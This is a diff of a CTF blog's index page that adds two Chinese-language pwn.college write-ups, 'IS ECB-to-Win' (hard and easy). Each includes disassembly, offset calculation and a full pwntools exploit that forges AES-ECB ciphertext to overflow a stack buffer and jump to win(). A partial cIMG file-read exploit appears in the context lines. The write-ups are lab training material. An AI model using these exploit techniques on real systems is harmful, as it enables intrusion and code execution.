@@ -236,7 +236,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">196</span>
+          <span class="site-state-item-count">198</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -247,7 +247,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">114</span>
+        <span class="site-state-item-count">117</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -274,6 +274,237 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-is-ecb-to-win-hard/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/PwnCollege/PwnCollege-is-ecb-to-win-hard/" class="post-title-link" itemprop="url">PwnCollege - IS ECB-to-Win (hard)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-03-20 14:34:20" itemprop="dateCreated datePublished" datetime="2026-03-20T14:34:20+08:00">2026-03-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/PwnCollege/PwnCollege-is-ecb-to-win-hard/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-is-ecb-to-win-hard/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>同 easy 版本的 dispatch oracle 和 ECB block-by-block
+加密策略，区别在于没有 stack dump 提示，需要手动逆向 offset。</p>
+<h2 id="analysis">Analysis</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge; pdf @ sym.win&quot;</span> /challenge/vulnerable-overflow</span><br></pre></td></tr></table></figure>
+<p>关键溢出点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; plaintext struct 起始于 s1 = rbp - 0x60</span><br><span class="line">│           0x0040173b      lea rsi, [s1]           ; rbp - 0x60</span><br><span class="line">; message buffer = s1 + 0x10 (跳过 8 字节 header + 8 字节 length)</span><br><span class="line">│           0x0040173f      add rsi, 0x10           ; rbp - 0x50</span><br><span class="line">; buffer overflow: 无长度限制</span><br><span class="line">│           0x00401749      call sym.imp.EVP_DecryptUpdate</span><br></pre></td></tr></table></figure>
+<ul>
+<li>message buffer 起始于 <code>rbp - 0x50</code></li>
+<li>saved rbp 在 <code>rbp + 0x00</code>，saved rip 在
+<code>rbp + 0x08</code></li>
+<li>offset = <code>0x50 + 0x08</code> = <strong>88 bytes</strong></li>
+</ul>
+<p><code>sym.win</code> 地址:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">│           0x004013b6      endbr64</span><br><span class="line">│           0x004013be      lea rdi, str.You_win__Here_is_your_flag:</span><br></pre></td></tr></table></figure>
+<p>→ <code>win() = 0x4013b6</code></p>
+<h2 id="exploit">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x50 (buffer to rbp) + 0x08 (saved rbp) = 88</span></span><br><span class="line">OFFSET = <span class="number">88</span></span><br><span class="line">WIN_ADDR = <span class="number">0x4013b6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">block_data</span>):</span><br><span class="line">    p = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p.send(block_data)</span><br><span class="line">    p.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    ct = p.recvall()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> ct[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>():</span><br><span class="line">    p_init = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p_init.send(<span class="string">b&quot;A&quot;</span> * <span class="number">16</span>)</span><br><span class="line">    p_init.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    first_block_ct = p_init.recvall()[:<span class="number">16</span>]</span><br><span class="line">    p_init.close()</span><br><span class="line"></span><br><span class="line">    raw_payload = <span class="string">b&quot;A&quot;</span> * OFFSET + p64(WIN_ADDR)</span><br><span class="line">    padded_payload = pad(raw_payload, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    final_ct = first_block_ct</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_payload), <span class="number">16</span>):</span><br><span class="line">        final_ct += encrypt_block(padded_payload[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(final_ct)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> final_ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    payload = build_payload()</span><br><span class="line">    target = process(<span class="string">&quot;/challenge/vulnerable-overflow&quot;</span>)</span><br><span class="line">    target.send(payload)</span><br><span class="line">    target.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(target.recvall().decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-is-ecb-to-win-easy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/PwnCollege/PwnCollege-is-ecb-to-win-easy/" class="post-title-link" itemprop="url">PwnCollege - IS ECB-to-Win (easy)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-03-20 14:33:13 / Modified: 14:33:52" itemprop="dateCreated datePublished" datetime="2026-03-20T14:33:13+08:00">2026-03-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/PwnCollege/PwnCollege-is-ecb-to-win-easy/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-is-ecb-to-win-easy/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Concepts used: Cryptography + Binary Exploitation</p>
+</blockquote>
+<h2 id="source">Source</h2>
+<p><code>vulnerable-overflow</code> 读取密文，先解密第一个 block 验证
+header 和 length，再解密剩余 block 到栈上固定大小的
+<code>message[60]</code>。因为 <code>ciphertext_len</code>
+没有上限检查，<code>EVP_DecryptUpdate</code> 会直接造成栈溢出。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">challenge</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">char</span> header[<span class="number">8</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> length;</span><br><span class="line">        <span class="type">char</span> message[<span class="number">60</span>];</span><br><span class="line">    &#125; plaintext = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... key init, read ciphertext from stdin ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// verify first block</span></span><br><span class="line">    EVP_DecryptUpdate(ctx, (<span class="type">char</span> *)&amp;plaintext, &amp;decrypted_len, ciphertext, <span class="number">16</span>);</span><br><span class="line">    assert(<span class="built_in">memcmp</span>(plaintext.header, <span class="string">&quot;VERIFIED&quot;</span>, <span class="number">8</span>) == <span class="number">0</span>);</span><br><span class="line">    assert(plaintext.length &lt;= <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// buffer overflow: no bounds check on ciphertext_len</span></span><br><span class="line">    EVP_DecryptUpdate(ctx, plaintext.message, &amp;decrypted_len,</span><br><span class="line">                      ciphertext + <span class="number">16</span>, ciphertext_len - <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>dispatch</code> 是加密 oracle，接受最多 16 字节的 message，拼上
+<code>VERIFIED</code> header 后用相同 key 的 AES-ECB 加密输出：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="built_in">open</span>(<span class="string">&quot;/challenge/.key&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">cipher = AES.new(key=key, mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">message = sys.stdin.buffer.read1()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(message) &lt;= <span class="number">16</span>, <span class="string">&quot;Your message is too long!&quot;</span></span><br><span class="line">plaintext = <span class="string">b&quot;VERIFIED&quot;</span> + struct.pack(<span class="string">b&quot;&lt;Q&quot;</span>, <span class="built_in">len</span>(message)) + message</span><br><span class="line">ciphertext = cipher.encrypt(pad(plaintext, cipher.block_size))</span><br><span class="line">sys.stdout.buffer.write(ciphertext)</span><br></pre></td></tr></table></figure>
+<h2 id="analysis">Analysis</h2>
+<p>ECB 模式下每个 16 字节 block 独立加密，相同明文 block 产生相同密文
+block。因此可以：</p>
+<ol type="1">
+<li>调用 <code>dispatch</code> 获取合法的第一个 block（包含
+<code>VERIFIED</code> header）的密文</li>
+<li>将 payload 按 16 字节分块，逐块调用 <code>dispatch</code> 加密</li>
+<li>拼接密文发送给
+<code>vulnerable-overflow</code>，解密后得到我们的任意 payload</li>
+</ol>
+<p>从 stack dump 中可以看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| 0x00007fff9c9fad20 (rsp+0x0040) | message buffer 开始位置</span><br><span class="line">| ...                              | 120 bytes of &#x27;A&#x27; padding</span><br><span class="line">| 0x00007fff9c9fad98 (rsp+0x00b8) | saved return address -&gt; 0x401e96</span><br></pre></td></tr></table></figure>
+<ul>
+<li>buffer 起始: <code>rsp+0x40</code>，saved rip: <code>rsp+0xb8</code>
+→ offset = <strong>120 bytes</strong></li>
+<li><code>win()</code> 地址: <code>0x4018f7</code></li>
+</ul>
+<h2 id="exploit">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">OFFSET = <span class="number">120</span></span><br><span class="line">WIN_ADDR = <span class="number">0x4018f7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">block_data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;调用 dispatch 加密单个 16 字节 block，返回对应密文&quot;&quot;&quot;</span></span><br><span class="line">    p = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p.send(block_data)</span><br><span class="line">    p.shutdown(<span class="string">&quot;send&quot;</span>)  <span class="comment"># 必须发送 EOF，否则 read1() 阻塞</span></span><br><span class="line">    ct = p.recvall()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> ct[<span class="number">16</span>:<span class="number">32</span>]  <span class="comment"># 跳过第一个 block (VERIFIED header)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>():</span><br><span class="line">    <span class="comment"># 获取合法的第一个 block 密文 (通过 dispatch 加密任意 16 字节 message)</span></span><br><span class="line">    p_init = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p_init.send(<span class="string">b&quot;A&quot;</span> * <span class="number">16</span>)</span><br><span class="line">    p_init.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    first_block_ct = p_init.recvall()[:<span class="number">16</span>]</span><br><span class="line">    p_init.close()</span><br><span class="line"></span><br><span class="line">    raw_payload = <span class="string">b&quot;A&quot;</span> * OFFSET + p64(WIN_ADDR)</span><br><span class="line">    padded_payload = pad(raw_payload, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 逐块加密，拼接密文</span></span><br><span class="line">    final_ct = first_block_ct</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_payload), <span class="number">16</span>):</span><br><span class="line">        final_ct += encrypt_block(padded_payload[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(final_ct)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> final_ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    payload = build_payload()</span><br><span class="line">    target = process(<span class="string">&quot;/challenge/vulnerable-overflow&quot;</span>)</span><br><span class="line">    target.send(payload)</span><br><span class="line">    target.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(target.recvall().decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1390,250 +1621,6 @@ in an animated cIMG! Good luck.</p>
 <p>generate flag.cimg</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">raw_flag_lines = subprocess.check_output([<span class="string">&quot;/usr/bin/figlet&quot;</span>, <span class="string">&quot;-fascii9&quot;</span>], <span class="built_in">input</span>=<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()).split(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">max_line_length = <span class="built_in">max</span>(<span class="built_in">len</span>(line) <span class="keyword">for</span> line <span class="keyword">in</span> raw_flag_lines)</span><br><span class="line">flag_lines = [ line.ljust(max_line_length) <span class="keyword">for</span> line <span class="keyword">in</span> raw_flag_lines ]</span><br><span class="line"></span><br><span class="line">flag_pixels = [ ]</span><br><span class="line"><span class="keyword">for</span> y,line <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag_lines):</span><br><span class="line">	<span class="keyword">for</span> x,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(line):</span><br><span class="line">		flag_pixels += [ (x, y, c) ]</span><br><span class="line">random.shuffle(flag_pixels)</span><br><span class="line"></span><br><span class="line">directives = [ ]</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> flag_pixels:</span><br><span class="line">	directives += [ struct.pack(<span class="string">&quot;&lt;HBBBBBBBB&quot;</span>, <span class="number">2</span>, p[<span class="number">0</span>], p[<span class="number">1</span>], <span class="number">1</span>, <span class="number">1</span>, <span class="number">0x8c</span>, <span class="number">0x1d</span>, <span class="number">0x40</span>, p[<span class="number">2</span>]) ]</span><br><span class="line">	directives += [ struct.pack(<span class="string">&quot;&lt;HB&quot;</span>, <span class="number">6</span>, <span class="number">1</span>) ]</span><br><span class="line">	directives += [ struct.pack(<span class="string">&quot;&lt;HI&quot;</span>, <span class="number">7</span>, <span class="number">733_331</span>) ] <span class="comment"># milliseconds to wait</span></span><br><span class="line"></span><br><span class="line">img = <span class="string">b&quot;cIMG&quot;</span> + struct.pack(<span class="string">&quot;&lt;HBBI&quot;</span>, <span class="number">4</span>, max_line_length, <span class="built_in">len</span>(flag_lines), <span class="built_in">len</span>(directives)) + <span class="string">b&quot;&quot;</span>.join(directives)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/challenge/flag.cimg&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> o:</span><br><span class="line">	o.write(img)</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    binary_path = <span class="string">&quot;/challenge/cimg&quot;</span></span><br><span class="line"></span><br><span class="line">    flag_len = <span class="number">59</span></span><br><span class="line">    payload = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 极简 Header: Version 4, 画布大小 100x1, 2 个指令</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;4sHBBI&quot;</span>, <span class="string">b&quot;cIMG&quot;</span>, <span class="number">4</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. Directive 1 -&gt; handle_5: 任意文件加载</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;H&quot;</span>, <span class="number">5</span>)  <span class="comment"># Opcode 5</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;BBB&quot;</span>, <span class="number">1</span>, flag_len, <span class="number">1</span>)  <span class="comment"># ID=1, Width=flag_len, Height=1</span></span><br><span class="line">    path = <span class="string">b&quot;/flag&quot;</span>.ljust(<span class="number">255</span>, <span class="string">b&quot;\x00&quot;</span>)  <span class="comment"># 恶意路径，Null截断</span></span><br><span class="line">    payload += path</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. Directive 2 -&gt; handle_4: 渲染到屏幕</span></span><br><span class="line">    <span class="comment"># 参数: Opcode(4), ID(1), R(255), G(255), B(255), X(0), Y(0), RepeatX(1), RepeatY(1), Trans(0)</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;HBBBBBBBBB&quot;</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    file_name = <span class="string">&quot;exploit_payload.cimg&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process([binary_path, file_name])</span><br><span class="line">        out = p.recvall(timeout=<span class="number">1</span>).decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> out:</span><br><span class="line">            clean_text = re.sub(<span class="string">r&quot;\x1b\[.*?m&quot;</span>, <span class="string">&quot;&quot;</span>, out)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;pwn.college&quot;</span> <span class="keyword">in</span> clean_text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Success Flag length: <span class="subst">&#123;flag_len&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Raw Flag: <span class="subst">&#123;clean_text.strip()&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Exploit failed.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-re-unsafe-animations/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
